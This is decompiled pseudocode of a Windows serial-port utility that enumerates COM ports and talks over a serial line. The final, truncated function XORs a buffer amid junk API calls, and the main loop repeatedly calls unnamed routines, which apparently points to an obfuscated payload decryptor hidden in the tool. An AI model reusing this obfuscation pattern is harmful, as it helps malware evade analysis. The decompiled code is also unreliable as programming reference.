//----- (0040155C) --------------------------------------------------------
int sub_40155C()
{
  BYTE PropertyBuffer[260]; // [esp+1Ch] [ebp-2BCh] BYREF
  DWORD PropertyBufferSize; // [esp+120h] [ebp-1B8h] BYREF
  DWORD PropertyRegDataType; // [esp+124h] [ebp-1B4h] BYREF
  size_t v4; // [esp+128h] [ebp-1B0h]
  BYTE Data[3]; // [esp+12Ch] [ebp-1ACh] BYREF
  char String[257]; // [esp+12Fh] [ebp-1A9h] BYREF
  DWORD cbData; // [esp+230h] [ebp-A8h] BYREF
  DWORD Type; // [esp+234h] [ebp-A4h] BYREF
  int v9; // [esp+238h] [ebp-A0h]
  HKEY hKey; // [esp+23Ch] [ebp-9Ch]
  int v11; // [esp+240h] [ebp-98h]
  _BYTE v12[20]; // [esp+244h] [ebp-94h] BYREF
  unsigned int Src[3]; // [esp+258h] [ebp-80h] BYREF
  void *v14[7]; // [esp+264h] [ebp-74h] BYREF
  void *v15[7]; // [esp+280h] [ebp-58h] BYREF
  DWORD MemberIndex; // [esp+29Ch] [ebp-3Ch]
  BOOL v17; // [esp+2A0h] [ebp-38h]
  HDEVINFO DeviceInfoSet; // [esp+2A4h] [ebp-34h]
  struct _SP_DEVINFO_DATA DeviceInfoData; // [esp+2A8h] [ebp-30h] BYREF
  LPGUID ClassGuidList; // [esp+2C4h] [ebp-14h]
  DWORD RequiredSize; // [esp+2C8h] [ebp-10h] BYREF
  int v22; // [esp+2D4h] [ebp-4h]

  RequiredSize = 0;
  SetupDiClassGuidsFromNameA("Ports", 0, 0, &RequiredSize);
  if ( !RequiredSize )
    return 0;
  ClassGuidList = (LPGUID)operator new[](16 * RequiredSize);
  if ( ClassGuidList )
  {
    if ( SetupDiClassGuidsFromNameA("Ports", ClassGuidList, RequiredSize, &RequiredSize) )
    {
      DeviceInfoSet = SetupDiGetClassDevsA(ClassGuidList, 0, 0, 2u);
      if ( DeviceInfoSet == (HDEVINFO)-1 )
      {
        return 0;
      }
      else
      {
        v17 = 1;
        MemberIndex = 0;
        while ( v17 )
        {
          DeviceInfoData.cbSize = 28;
          v17 = SetupDiEnumDeviceInfo(DeviceInfoSet, MemberIndex, &DeviceInfoData);
          if ( !byte_4512BD )
          {
            sub_41D460(Src, 0xAu, v12);
            sub_4013DB(Src, 0xAu, v12);
            sub_401D04(v15, "open");
            v22 = 0;
            sub_401427(v14);
            LOBYTE(v22) = 1;
            sub_401DA9(v14, 1, 0);
            v22 = 2;
            sub_401DA9(v15, 1, 0);
            v22 = -1;
            GetModuleHandleA(0);
            sub_4055D5();
            byte_4512BD = 1;
          }
          if ( v17 )
          {
            v11 = 0;
            v9 = 0;
            hKey = SetupDiOpenDevRegKey(DeviceInfoSet, &DeviceInfoData, 1u, 0, 1u, 1u);
            if ( hKey )
            {
              cbData = 256;
              Type = 0;
              if ( !RegQueryValueExA(hKey, "PortName", 0, &Type, Data, &cbData) && Type == 1 )
              {
                v4 = strlen((const char *)Data);
                if ( v4 > 3 && !_mbsnbicmp(Data, "COM", 3u) && sub_4014E3(String, 0) )
                {
                  v9 = atoi(String);
                  v11 = 1;
                }
              }
              RegCloseKey(hKey);
            }
            if ( v11 )
            {
              PropertyBufferSize = 256;
              PropertyRegDataType = 0;
              if ( SetupDiGetDeviceRegistryPropertyA(
                     DeviceInfoSet,
                     &DeviceInfoData,
                     0xCu,
                     &PropertyRegDataType,
                     PropertyBuffer,
                     0x100u,
                     &PropertyBufferSize) )
              {
                if ( PropertyRegDataType == 1 && !sub_40191B(PropertyBuffer, v9) )
                  sub_401871(v9, (char *)PropertyBuffer);
              }
            }
          }
          ++MemberIndex;
        }
        SetupDiDestroyDeviceInfoList(DeviceInfoSet);
        return 1;
      }
    }
    else
    {
      return 0;
    }
  }
  else
  {
    SetLastError(0xEu);
    return 0;
  }
}
// 4512BD: using guessed type char byte_4512BD;
// 40155C: using guessed type _BYTE var_94[20];
// 40155C: using guessed type unsigned int Src[3];

//----- (00401871) --------------------------------------------------------
CHAR *__cdecl sub_401871(int a1, char *Source)
{
  CHAR *result; // eax
  CHAR *v3; // [esp+4h] [ebp-4h]

  v3 = (CHAR *)operator new(0x818u);
  memset(v3, 0, 0x818u);
  wsprintfA(v3 + 12, "COM%u", a1);
  strcpy(v3 + 1037, Source);
  *((_DWORD *)v3 + 2) = a1;
  *((_DWORD *)v3 + 516) = 1;
  *((_DWORD *)v3 + 1) = dword_4512C4++;
  if ( dword_4512C0 )
    *(_DWORD *)dword_4512B8 = v3;
  else
    dword_4512C0 = (int)v3;
  result = v3;
  dword_4512B8 = (int)v3;
  return result;
}
// 4512B8: using guessed type int dword_4512B8;
// 4512C0: using guessed type int dword_4512C0;
// 4512C4: using guessed type int dword_4512C4;

//----- (0040191B) --------------------------------------------------------
int __cdecl sub_40191B(unsigned __int8 *Str2, int a2)
{
  int i; // [esp+0h] [ebp-4h]

  for ( i = dword_4512C0; i; i = *(_DWORD *)i )
  {
    if ( !_mbscmp((const unsigned __int8 *)(i + 1037), Str2) )
    {
      *(_DWORD *)(i + 8) = a2;
      return 1;
    }
  }
  return 0;
}
// 4512C0: using guessed type int dword_4512C0;

//----- (00401962) --------------------------------------------------------
CHAR *__cdecl sub_401962(LPCWCH lpWideCharStr)
{
  WideCharToMultiByte(0, 0, lpWideCharStr, -1, MultiByteStr, 1024, 0, 0);
  return MultiByteStr;
}

//----- (00401989) --------------------------------------------------------
int sub_401989()
{
  CHAR *v0; // eax
  const char *v2; // [esp+0h] [ebp-Ch]
  const char *v3; // [esp+4h] [ebp-8h]
  int i; // [esp+8h] [ebp-4h]

  sub_401A13();
  for ( i = dword_4512C0; i; i = *(_DWORD *)i )
  {
    if ( *(_DWORD *)(i + 2068) )
      v3 = "YES";
    else
      v3 = "no";
    if ( *(_DWORD *)(i + 2064) )
      v2 = "YES";
    else
      v2 = "no";
    v0 = sub_401962((LPCWCH)(i + 1037));
    printf("COM%-2u   %-3s    %-3s   %s\n", *(_DWORD *)(i + 8), v2, v3, v0);
  }
  return 0;
}
// 4512C0: using guessed type int dword_4512C0;

//----- (00401A13) --------------------------------------------------------
int sub_401A13()
{
  int result; // eax
  HMODULE ModuleHandleA; // eax
  HANDLE hObject; // [esp+0h] [ebp-A4h]
  struct _OSVERSIONINFOA VersionInformation; // [esp+4h] [ebp-A0h] BYREF
  int i; // [esp+A0h] [ebp-4h]

  VersionInformation.dwOSVersionInfoSize = 148;
  result = GetVersionExA(&VersionInformation);
  if ( result )
  {
    if ( VersionInformation.dwMajorVersion >= 5 )
    {
      sub_401ADC();
      result = sub_40155C();
      if ( dword_4512C0 )
      {
        result = dword_4512C0;
        for ( i = dword_4512C0; i; i = *(_DWORD *)i )
        {
          ModuleHandleA = GetModuleHandleA(0);
          sub_40589A(ModuleHandleA);
          hObject = CreateFileA((LPCSTR)(i + 12), 0xC0000000, 0, 0, 3u, 0, 0);
          if ( hObject != (HANDLE)-1 )
          {
            *(_DWORD *)(i + 2064) = 1;
            CloseHandle(hObject);
          }
          result = *(_DWORD *)i;
        }
      }
    }
  }
  return result;
}
// 4512C0: using guessed type int dword_4512C0;

//----- (00401ADC) --------------------------------------------------------
char sub_401ADC()
{
  HMODULE ModuleHandleA; // eax
  BOOL DeviceInterfaceDetailA; // eax
  void *v3; // [esp+18h] [ebp-58h]
  struct _SP_DEVINFO_DATA DeviceInfoData; // [esp+1Ch] [ebp-54h] BYREF
  struct _SP_DEVICE_INTERFACE_DATA DeviceInterfaceData; // [esp+38h] [ebp-38h] BYREF
  PSP_DEVICE_INTERFACE_DETAIL_DATA_A DeviceInterfaceDetailData; // [esp+54h] [ebp-1Ch]
  GUID *ClassGuid; // [esp+58h] [ebp-18h]
  bool v8; // [esp+5Fh] [ebp-11h]
  DWORD MemberIndex; // [esp+60h] [ebp-10h]
  HDEVINFO DeviceInfoSet; // [esp+64h] [ebp-Ch]
  BOOL DeviceRegistryPropertyA; // [esp+68h] [ebp-8h]
  DWORD DeviceInterfaceDetailDataSize; // [esp+6Ch] [ebp-4h]

  ClassGuid = &stru_423870;
  DeviceInterfaceDetailData = 0;
  DeviceInfoSet = SetupDiGetClassDevsA(&stru_423870, 0, 0, 0x12u);
  if ( DeviceInfoSet == (HDEVINFO)-1 )
  {
LABEL_23:
    if ( DeviceInterfaceDetailData )
      sub_40BB07(DeviceInterfaceDetailData);
    if ( DeviceInfoSet != (HDEVINFO)-1 )
      SetupDiDestroyDeviceInfoList(DeviceInfoSet);
    return 0;
  }
  else
  {
    v8 = 1;
    DeviceInterfaceDetailDataSize = 261;
    DeviceInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_A)operator new[](0x105u);
    DeviceInterfaceData.cbSize = 28;
    DeviceInterfaceDetailData->cbSize = 5;
    MemberIndex = 0;
    while ( v8 )
    {
      v8 = SetupDiEnumDeviceInterfaces(DeviceInfoSet, 0, ClassGuid, MemberIndex, &DeviceInterfaceData);
      if ( !byte_4512BC )
      {
        ModuleHandleA = GetModuleHandleA(0);
        sub_404498((int)ModuleHandleA);
        byte_4512BC = 1;
      }
      if ( v8 )
      {
        DeviceInfoData.cbSize = 28;
        memset(&DeviceInfoData.ClassGuid, 0, 0x18u);
        DeviceInterfaceDetailA = SetupDiGetDeviceInterfaceDetailA(
                                   DeviceInfoSet,
                                   &DeviceInterfaceData,
                                   DeviceInterfaceDetailData,
                                   DeviceInterfaceDetailDataSize,
                                   0,
                                   &DeviceInfoData);
        v8 = DeviceInterfaceDetailA;
        if ( !DeviceInterfaceDetailA )
          goto LABEL_23;
        v3 = operator new(0x818u);
        memset(v3, 0, 0x818u);
        lstrcpynA((LPSTR)v3 + 12, DeviceInterfaceDetailData->DevicePath, 1024);
        DeviceRegistryPropertyA = SetupDiGetDeviceRegistryPropertyA(
                                    DeviceInfoSet,
                                    &DeviceInfoData,
                                    0xCu,
                                    0,
                                    (PBYTE)v3 + 1037,
                                    0x400u,
                                    0);
        *((_DWORD *)v3 + 517) = 1;
        if ( DeviceRegistryPropertyA )
        {
          *((_DWORD *)v3 + 1) = dword_4512C4++;
          if ( dword_4512C0 )
            *(_DWORD *)dword_4512B8 = v3;
          else
            dword_4512C0 = (int)v3;
          dword_4512B8 = (int)v3;
        }
      }
      else if ( GetLastError() != 259 )
      {
        goto LABEL_23;
      }
      ++MemberIndex;
    }
    if ( DeviceInterfaceDetailData )
      sub_40BB07(DeviceInterfaceDetailData);
    if ( DeviceInfoSet != (HDEVINFO)-1 )
      SetupDiDestroyDeviceInfoList(DeviceInfoSet);
    return 1;
  }
}
// 423870: using guessed type GUID stru_423870;
// 4512B8: using guessed type int dword_4512B8;
// 4512BC: using guessed type char byte_4512BC;
// 4512C0: using guessed type int dword_4512C0;
// 4512C4: using guessed type int dword_4512C4;

//----- (00401D04) --------------------------------------------------------
void **__thiscall sub_401D04(void **this, char *Str)
{
  int v2; // edx
  size_t Size; // [esp+14h] [ebp-1Ch]
  char v6; // [esp+1Bh] [ebp-15h] BYREF
  char *v7; // [esp+1Ch] [ebp-14h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = &v6;
  v8 = 0;
  sub_401DA9(this, 0, 0);
  Size = strlen(Str);
  sub_401E36((int)this, v2, Str, Size);
  return this;
}
// 401D53: variable 'v2' is possibly undefined

//----- (00401D6D) --------------------------------------------------------
int __thiscall sub_401D6D(void **this)
{
  return sub_401DA9(this, 1, 0);
}

//----- (00401DA9) --------------------------------------------------------
int __thiscall sub_401DA9(void **this, char a2, size_t Size)
{
  int result; // eax
  void **v4; // [esp+0h] [ebp-14h]
  void *Src; // [esp+10h] [ebp-4h]

  if ( a2 && (unsigned int)this[5] >= 0x10 )
  {
    Src = *this;
    if ( Size )
      memcpy(this, Src, Size);
    operator delete(Src);
  }
  this[5] = (void *)15;
  this[4] = (void *)Size;
  if ( (unsigned int)this[5] < 0x10 )
    v4 = this;
  else
    v4 = (void **)*this;
  result = (int)v4 + Size;
  *((_BYTE *)v4 + Size) = 0;
  return result;
}

//----- (00401E36) --------------------------------------------------------
void **__fastcall sub_401E36(int a1, int a2, _BYTE *Src, size_t Size)
{
  _BYTE *v5; // [esp+0h] [ebp-14h]
  _BYTE *v6; // [esp+4h] [ebp-10h]

  if ( sub_4020DF((_DWORD *)a1, a2, (unsigned int)Src) )
  {
    if ( *(_DWORD *)(a1 + 20) < 0x10u )
      v6 = (_BYTE *)a1;
    else
      v6 = *(_BYTE **)a1;
    return sub_401EF7((void **)a1, (void **)a1, Src - v6, Size);
  }
  else
  {
    if ( sub_401FFD(a1, Size, 0) )
    {
      if ( *(_DWORD *)(a1 + 20) < 0x10u )
        memcpy((void *)a1, Src, Size);
      else
        memcpy(*(void **)a1, Src, Size);
      *(_DWORD *)(a1 + 16) = Size;
      if ( *(_DWORD *)(a1 + 20) < 0x10u )
        v5 = (_BYTE *)a1;
      else
        v5 = *(_BYTE **)a1;
      v5[Size] = 0;
    }
    return (void **)a1;
  }
}

//----- (00401EF7) --------------------------------------------------------
void **__thiscall sub_401EF7(void **this, void **a2, unsigned int a3, size_t a4)
{
  void **v5; // [esp+0h] [ebp-20h]
  void **v6; // [esp+4h] [ebp-1Ch]
  size_t Size; // [esp+1Ch] [ebp-4h]

  if ( (unsigned int)a2[4] < a3 )
    std::_Xout_of_range("invalid string position");
  Size = (size_t)a2[4] - a3;
  if ( a4 < Size )
    Size = a4;
  if ( this == a2 )
  {
    sub_402142(this, Size + a3, 0xFFFFFFFF);
    sub_402142(this, 0, a3);
  }
  else if ( sub_401FFD((int)this, Size, 0) )
  {
    if ( (unsigned int)a2[5] < 0x10 )
      v6 = a2;
    else
      v6 = (void **)*a2;
    if ( (unsigned int)this[5] < 0x10 )
      memcpy(this, (char *)v6 + a3, Size);
    else
      memcpy(*this, (char *)v6 + a3, Size);
    this[4] = (void *)Size;
    if ( (unsigned int)this[5] < 0x10 )
      v5 = this;
    else
      v5 = (void **)*this;
    *((_BYTE *)v5 + Size) = 0;
  }
  return this;
}

//----- (00401FFD) --------------------------------------------------------
BOOL __thiscall sub_401FFD(int this, unsigned int a2, char a3)
{
  _BYTE *v4; // [esp+0h] [ebp-20h]

  if ( a2 == -1 )
    std::_Xlength_error("string too long");
  if ( *(_DWORD *)(this + 20) >= a2 )
  {
    if ( a3 && a2 < 0x10 )
    {
      if ( a2 >= *(_DWORD *)(this + 16) )
        sub_401DA9((void **)this, 1, *(_DWORD *)(this + 16));
      else
        sub_401DA9((void **)this, 1, a2);
    }
    else if ( !a2 )
    {
      *(_DWORD *)(this + 16) = 0;
      if ( *(_DWORD *)(this + 20) < 0x10u )
        v4 = (_BYTE *)this;
      else
        v4 = *(_BYTE **)this;
      *v4 = 0;
    }
  }
  else
  {
    sub_402225((void **)this, a2, *(_DWORD *)(this + 16));
  }
  return a2 != 0;
}
// 402025: conditional instruction was optimized away because %var_14.4==FFFFFFFF

//----- (004020DF) --------------------------------------------------------
bool __fastcall sub_4020DF(_DWORD *a1, int a2, unsigned int a3)
{
  bool result; // al
  _DWORD *v4; // [esp+0h] [ebp-Ch]
  _DWORD *v5; // [esp+4h] [ebp-8h]

  result = 0;
  if ( a3 )
  {
    v5 = a1[5] < 0x10u ? a1 : (_DWORD *)*a1;
    if ( a3 >= (unsigned int)v5 )
    {
      v4 = a1[5] < 0x10u ? a1 : (_DWORD *)*a1;
      if ( (unsigned int)v4 + a1[4] > a3 )
        return 1;
    }
  }
  return result;
}

//----- (00402142) --------------------------------------------------------
_DWORD *__thiscall sub_402142(_DWORD *this, unsigned int a2, unsigned int a3)
{
  _DWORD *v4; // [esp+0h] [ebp-1Ch]
  _DWORD *v5; // [esp+4h] [ebp-18h]
  _DWORD *v6; // [esp+8h] [ebp-14h]
  unsigned int v8; // [esp+18h] [ebp-4h]

  if ( this[4] < a2 )
    std::_Xout_of_range("invalid string position");
  if ( this[4] - a2 < a3 )
    a3 = this[4] - a2;
  if ( a3 )
  {
    if ( this[5] < 0x10u )
      v6 = this;
    else
      v6 = (_DWORD *)*this;
    if ( this[5] < 0x10u )
      v5 = this;
    else
      v5 = (_DWORD *)*this;
    memcpy_0((char *)v5 + a2, (char *)v6 + a2 + a3, this[4] - a2 - a3);
    v8 = this[4] - a3;
    this[4] = v8;
    if ( this[5] < 0x10u )
      v4 = this;
    else
      v4 = (_DWORD *)*this;
    *((_BYTE *)v4 + v8) = 0;
  }
  return this;
}

//----- (00402225) --------------------------------------------------------
int __thiscall sub_402225(void **this, int a2, size_t Size)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-94h] BYREF
  void **v5; // [esp+Ch] [ebp-88h]
  void *v6; // [esp+14h] [ebp-80h]
  int v7; // [esp+18h] [ebp-7Ch]
  int v8; // [esp+1Ch] [ebp-78h]
  int v9; // [esp+20h] [ebp-74h]
  int v10; // [esp+24h] [ebp-70h]
  int v11; // [esp+28h] [ebp-6Ch]
  int v12; // [esp+2Ch] [ebp-68h]
  void **v13; // [esp+30h] [ebp-64h]
  char v14; // [esp+37h] [ebp-5Dh]
  void *Src; // [esp+38h] [ebp-5Ch]
  int v16; // [esp+64h] [ebp-30h]
  int v17; // [esp+68h] [ebp-2Ch]
  int v18; // [esp+6Ch] [ebp-28h]
  int v19; // [esp+70h] [ebp-24h]
  int v20; // [esp+74h] [ebp-20h]
  int v21; // [esp+78h] [ebp-1Ch]
  unsigned int v22; // [esp+7Ch] [ebp-18h]
  void *v23; // [esp+80h] [ebp-14h]
  int *v24; // [esp+84h] [ebp-10h]
  int v25; // [esp+90h] [ebp-4h]

  v24 = &v4;
  v13 = this;
  v22 = a2 | 0xF;
  v20 = -1;
  v12 = -1;
  v21 = -1;
  v11 = -2;
  if ( (a2 | 0xF) == -1 )
  {
    v22 = a2;
  }
  else if ( (unsigned int)v13[5] >> 1 > v22 / 3 )
  {
    v18 = -1;
    v10 = -1;
    v19 = -1;
    v9 = -2;
    if ( (unsigned int)v13[5] > -2 - ((unsigned int)v13[5] >> 1) )
    {
      v16 = -1;
      v8 = -1;
      v17 = -1;
      v7 = -2;
      v22 = -2;
    }
    else
    {
      v22 = (unsigned int)v13[5] + ((unsigned int)v13[5] >> 1);
    }
  }
  v25 = 0;
  v6 = sub_40A089(v22 + 1);
  v23 = v6;
  v25 = -1;
  if ( Size )
  {
    if ( (unsigned int)v13[5] < 0x10 )
      Src = v13;
    else
      Src = *v13;
    memcpy(v23, Src, Size);
  }
  sub_401DA9(v13, 1, 0);
  *v13 = v23;
  v13[5] = (void *)v22;
  v14 = 0;
  v13[4] = (void *)Size;
  if ( (unsigned int)v13[5] < 0x10 )
    v5 = v13;
  else
    v5 = (void **)*v13;
  result = (int)v5 + Size;
  *((_BYTE *)v5 + Size) = v14;
  return result;
}
// 402272: conditional instruction was optimized away because %var_68.4==FFFFFFFF
// 4022D1: conditional instruction was optimized away because %var_70.4==FFFFFFFF
// 40232A: conditional instruction was optimized away because %var_78.4==FFFFFFFF

//----- (0040245D) --------------------------------------------------------
void __thiscall sub_40245D(std::exception *this)
{
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  sub_40C2D5(this);
}
// 423904: using guessed type void *std::bad_alloc::`vftable';

//----- (00402477) --------------------------------------------------------
std::exception *__thiscall sub_402477(std::exception *this, char a2)
{
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  sub_40C2D5(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}
// 423904: using guessed type void *std::bad_alloc::`vftable';

//----- (004024A7) --------------------------------------------------------
std::exception *__thiscall sub_4024A7(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 423904: using guessed type void *std::bad_alloc::`vftable';

//----- (004024C9) --------------------------------------------------------
DWORD __cdecl sub_4024C9(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  char *v2; // eax
  char *v3; // eax
  char *v4; // eax
  DWORD v6; // [esp+0h] [ebp-2Ch]
  int v7; // [esp+8h] [ebp-24h]
  int v8; // [esp+Ch] [ebp-20h]
  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-1Ch] BYREF
  struct _OVERLAPPED Overlapped; // [esp+14h] [ebp-18h] BYREF
  HANDLE hObject; // [esp+28h] [ebp-4h]

  NumberOfBytesWritten = 0;
  memset(&Overlapped, 0, sizeof(Overlapped));
  hObject = CreateEventA(0, 1, 0, 0);
  Overlapped.hEvent = hObject;
  if ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, &Overlapped) )
  {
    if ( GetLastError() == 997 )
    {
      v8 = 0;
      v7 = 0;
      while ( !v7 )
      {
        v6 = WaitForSingleObject(Overlapped.hEvent, 0x3E8u);
        if ( v6 )
        {
          if ( v6 == 258 )
          {
            if ( (unsigned int)++v8 > 5 )
            {
              printf("send_serial_msg: write did not complete!\n");
              NumberOfBytesWritten = -258;
              v7 = 1;
            }
          }
          else
          {
            NumberOfBytesWritten = GetLastError();
            v4 = sub_401091(NumberOfBytesWritten);
            printf("Write (W4SO): %s\n", v4);
            NumberOfBytesWritten = -NumberOfBytesWritten;
            v7 = 1;
          }
        }
        else
        {
          if ( !GetOverlappedResult(hFile, &Overlapped, &NumberOfBytesWritten, 0) )
          {
            NumberOfBytesWritten = GetLastError();
            v3 = sub_401091(NumberOfBytesWritten);
            printf("GetOverlappedResult: %s\n", v3);
            NumberOfBytesWritten = -NumberOfBytesWritten;
          }
          v7 = 1;
        }
      }
    }
    else
    {
      NumberOfBytesWritten = GetLastError();
      v2 = sub_401091(NumberOfBytesWritten);
      printf("WriteFile: %s\n", v2);
      NumberOfBytesWritten = -NumberOfBytesWritten;
    }
  }
  CloseHandle(hObject);
  dword_451760 = 0;
  return NumberOfBytesWritten;
}
// 451760: using guessed type int dword_451760;

//----- (00402649) --------------------------------------------------------
bool sub_402649()
{
  return dword_45176C != 0;
}
// 45176C: using guessed type int dword_45176C;

//----- (00402658) --------------------------------------------------------
char sub_402658()
{
  char v1; // [esp+1h] [ebp-1h]

  if ( !dword_45176C )
    return 0;
  v1 = byte_4516D8[dword_451768++];
  if ( (unsigned int)dword_451768 >= 0x80 )
    dword_451768 = 0;
  --dword_45176C;
  return v1;
}
// 451768: using guessed type int dword_451768;
// 45176C: using guessed type int dword_45176C;

//----- (004026A5) --------------------------------------------------------
int sub_4026A5()
{
  if ( dword_44A098 )
    return sub_4026D6(dword_44A098, dword_44A09C);
  printf("serial uart number is not initialized\n");
  return 1;
}
// 44A098: using guessed type int dword_44A098;
// 44A09C: using guessed type int dword_44A09C;

//----- (004026D6) --------------------------------------------------------
int __cdecl sub_4026D6(int a1, DWORD a2)
{
  const CHAR *v2; // eax
  struct _DCB DCB; // [esp+4h] [ebp-30h] BYREF
  struct _COMMTIMEOUTS CommTimeouts; // [esp+20h] [ebp-14h] BYREF

  v2 = (const CHAR *)sub_4014AE(a1);
  if ( !v2 )
    return 1;
  hFile = CreateFileA(v2, 0xC0000000, 0, 0, 3u, 0x40000000u, 0);
  if ( hFile == (HANDLE)-1 )
    return 2;
  if ( SetupComm(hFile, 0x2800u, 0x2800u) )
  {
    memset(&DCB, 0, sizeof(DCB));
    DCB.DCBlength = 28;
    DCB.BaudRate = a2;
    *((_DWORD *)&DCB + 2) |= 1u;
    DCB.ByteSize = 8;
    DCB.StopBits = 0;
    if ( SetCommState(hFile, &DCB) )
    {
      CommTimeouts.ReadIntervalTimeout = -1;
      CommTimeouts.ReadTotalTimeoutMultiplier = -1;
      CommTimeouts.ReadTotalTimeoutConstant = 5000;
      CommTimeouts.WriteTotalTimeoutMultiplier = 0;
      CommTimeouts.WriteTotalTimeoutConstant = 0;
      if ( SetCommTimeouts(hFile, &CommTimeouts) )
      {
        dword_4516D0 = _beginthreadex(0, 0, StartAddress, 0, 0, 0);
        if ( dword_4516D0 )
          return 0;
        else
          return 9;
      }
      else
      {
        CloseHandle(hFile);
        return 6;
      }
    }
    else
    {
      CloseHandle(hFile);
      return 4;
    }
  }
  else
  {
    CloseHandle(hFile);
    return 3;
  }
}
// 4516D0: using guessed type int dword_4516D0;

//----- (00402812) --------------------------------------------------------
unsigned int __stdcall StartAddress(void *a1)
{
  struct _OVERLAPPED Overlapped; // [esp+0h] [ebp-24h] BYREF
  HANDLE hHandle; // [esp+14h] [ebp-10h]
  char Buffer[5]; // [esp+1Bh] [ebp-9h] BYREF
  DWORD NumberOfBytesRead; // [esp+20h] [ebp-4h] BYREF

  Overlapped.8 = 0i64;
  hHandle = CreateEventA(0, 1, 0, 0);
  Overlapped.hEvent = hHandle;
  ReadFile(hFile, Buffer, 1u, &NumberOfBytesRead, &Overlapped);
  do
  {
    *(_DWORD *)&Buffer[1] = WaitForSingleObject(hHandle, 0x3E8u);
    if ( dword_451760 )
      break;
    if ( !*(_DWORD *)&Buffer[1] )
    {
      GetOverlappedResult(hFile, &Overlapped, &NumberOfBytesRead, 1);
      Overlapped.Offset += NumberOfBytesRead;
      sub_4028D8(Buffer[0]);
      ResetEvent(hHandle);
      ReadFile(hFile, Buffer, 1u, &NumberOfBytesRead, &Overlapped);
    }
  }
  while ( !dword_451760 );
  CloseHandle(hHandle);
  return 0;
}
// 451760: using guessed type int dword_451760;

//----- (004028D8) --------------------------------------------------------
int __cdecl sub_4028D8(char a1)
{
  int result; // eax

  if ( (unsigned int)dword_45176C < 0x80 )
  {
    byte_4516D8[dword_451764++] = a1;
    if ( (unsigned int)dword_451764 >= 0x80 )
      dword_451764 = 0;
    return ++dword_45176C;
  }
  return result;
}
// 451764: using guessed type int dword_451764;
// 45176C: using guessed type int dword_45176C;

//----- (00402922) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HMODULE ModuleHandleA; // eax
  size_t nNumberOfBytesToWrite; // [esp+8h] [ebp-84h]
  int v7; // [esp+Ch] [ebp-80h]
  unsigned int v8; // [esp+18h] [ebp-74h]
  LPSTR v9; // [esp+20h] [ebp-6Ch]
  char Str[92]; // [esp+24h] [ebp-68h] BYREF
  int v11; // [esp+80h] [ebp-Ch]
  unsigned int v12; // [esp+88h] [ebp-4h]

  v11 = 1;
  v9 = lpCmdLine;
  Str[91] = 0;
  sub_401000();
  sub_40128B();
  v12 = 2000;
  v8 = 0;
  sub_401989();
  if ( !sub_4026A5() )
  {
    sprintf(Str, "\n\r");
    nNumberOfBytesToWrite = strlen(Str);
    sub_4024C9(Str, nNumberOfBytesToWrite);
    v7 = 0;
    do
    {
      if ( sub_402649() )
      {
        if ( (unsigned __int8)sub_402658() != Str[v7] )
          break;
        if ( ++v7 == nNumberOfBytesToWrite )
          break;
      }
      Sleep(0x64u);
      v8 += 100;
    }
    while ( v8 < v12 );
  }
  dword_451760 = 1;
  while ( dword_451760 )
  {
    Sleep(0x64u);
    ModuleHandleA = GetModuleHandleA(0);
    sub_40589A(ModuleHandleA);
  }
  return 0;
}
// 40295C: conditional instruction was optimized away because %var_70.4==1
// 402A16: conditional instruction was optimized away because %var_D.1==0
// 44A098: using guessed type int dword_44A098;
// 44A09C: using guessed type int dword_44A09C;
// 451760: using guessed type int dword_451760;

//----- (00404164) --------------------------------------------------------
int __cdecl Take(int a1, int a2)
{
  return a1 + a2 + 1801;
}

//----- (00404176) --------------------------------------------------------
HWND __stdcall sub_404176(int a1, int a2, int a3)
{
  HWND result; // eax
  unsigned int k; // [esp+4h] [ebp-3A8h]
  int j; // [esp+8h] [ebp-3A4h]
  LRESULT wParam; // [esp+Ch] [ebp-3A0h]
  HWND hWnd; // [esp+10h] [ebp-39Ch]
  int v8; // [esp+18h] [ebp-394h]
  char v9; // [esp+1Fh] [ebp-38Dh]
  int i; // [esp+24h] [ebp-388h]
  UINT_PTR v11; // [esp+30h] [ebp-37Ch]
  _DWORD pszPath[130]; // [esp+3Ch] [ebp-370h] BYREF
  HWND v13; // [esp+244h] [ebp-168h]
  HWND v14; // [esp+248h] [ebp-164h]
  UINT_PTR v15; // [esp+24Ch] [ebp-160h]
  HDC v16; // [esp+250h] [ebp-15Ch]
  char v17[28]; // [esp+254h] [ebp-158h] BYREF
  unsigned int v18; // [esp+270h] [ebp-13Ch]
  int v19; // [esp+274h] [ebp-138h]
  int v20; // [esp+278h] [ebp-134h]
  int v21; // [esp+27Ch] [ebp-130h]
  int v22; // [esp+2A8h] [ebp-104h]
  _DWORD v23[64]; // [esp+2ACh] [ebp-100h] BYREF

  v19 = a2;
  v22 = 0;
  v21 = 0;
  memset((char *)v23 + 1, 0, 0xFFu);
  v23[0] = dword_452300;
  memset((char *)pszPath + 2, 0, 0x206u);
  v16 = cpt;
  memset(v17, 0, sizeof(v17));
  v20 = dword_452300;
  pszPath[0] = ::hWnd;
  result = (HWND)PathFileExistsW((LPCWSTR)pszPath);
  v13 = result;
  if ( result != (HWND)dword_452300 )
  {
    v14 = ::hWnd;
    if ( v13 == ::hWnd )
      v14 = (HWND)((char *)cpt + 1);
    for ( i = 0; ; ++i )
    {
      result = (HWND)i;
      if ( i >= v19 )
        break;
      v9 = *(_BYTE *)(i + a1);
      v22 = v21 * a3;
      hWnd = ::hWnd;
      for ( wParam = SendMessageA(::hWnd, 0x1004u, 0, 0); wParam >= 0; --wParam )
      {
        if ( SendMessageA(hWnd, 0x102Cu, wParam, 2) == 2 )
          ++Y;
      }
      v8 = (v22 + 3 * a3) * a3 * v21 + 36;
      for ( j = 0; j < dword_452300 / 100; ++j )
        v15 += (unsigned __int8)c;
      if ( a3 )
        *(_BYTE *)(i + a1) = v8 ^ v9;
      else
        *(_BYTE *)(i + a1) = a1;
      for ( k = 0; k < v18 / (dword_452300 + 1); ++k )
      {
        if ( v11 > Y + c )
          v18 += Y;
      }
